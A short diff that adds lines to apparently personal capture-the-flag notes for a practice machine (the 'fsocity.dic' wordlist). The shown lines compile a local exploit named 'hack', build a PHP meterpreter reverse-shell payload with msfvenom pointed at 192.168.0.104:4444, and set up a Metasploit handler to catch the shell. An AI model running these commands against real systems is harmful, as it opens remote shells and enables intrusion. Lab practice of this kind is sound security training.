@@ -14,4 +14,8 @@ gcc 37292.c -o hack
 sort fsocity.dic | uniq -u > f.dic
 msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=4444 -e php/base64 -f raw > file.php
   use exploit/multi/handler
+    set payload php/meterpreter/reverse_tcp
+    set lhost 192.168.0.104
+    set lport 4444
+    run
 
